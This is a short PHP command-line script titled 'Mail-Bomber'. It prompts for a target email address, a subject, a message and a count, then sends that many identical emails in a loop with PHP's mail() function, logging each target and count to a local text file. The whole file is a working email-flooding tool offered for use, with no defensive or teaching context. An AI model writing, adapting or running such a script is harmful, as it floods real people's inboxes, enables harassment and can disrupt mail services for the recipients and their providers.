<?php
echo "Mail-Bomber\n";


//Function that checks if something typed is a number.
function is_number($value){
	while(!intval($value)){
		echo "Please, select a valid number of messages to be sent: ";
		$num = fopen('php://stdin', 'r');
		$value = intval(str_replace("\n", "", fgets($num,100)));
	}
	return $value;
}

//opening a .txt to store information about target/statistics.  
echo "type the adresse: ";
$my_info = fopen("my_info.txt", "a+") or die("Unable to open/read file");
$adresse = fopen('php://stdin', 'r');
$adresse_string = str_replace("\n", "", fgets($adresse,100));
fwrite($my_info, (string)$adresse_string . ', ');

//same as subject
echo "Enter the subject: ";
$subject = fopen('php://stdin', 'r');
$subject_string = str_replace("\n", "", fgets($subject,100));
fwrite($my_info, (string)$subject_string . ', ');

//message body
echo "Enter the message: ";
$message = fopen('php://stdin', 'r');
$messageString = str_replace("\n", "", fgets($message,100));
fwrite($my_info, (string)$messageString . ', ');

echo "Please, select the number of messages to be sent: ";
$num = fopen('php://stdin', 'r');
$num_string = str_replace("\n", "", fgets($num,100));
$num_int = is_number(intval($num_string));
if($num_int){
	for($i = 0; $i < intval($num_string); $i++){
		mail($adresse_string, $subject_string, $messageString);
		}
	fwrite($my_info, 'number of messages sent: ' . (string)$num_string . PHP_EOL);	
}
fclose($my_info);


?>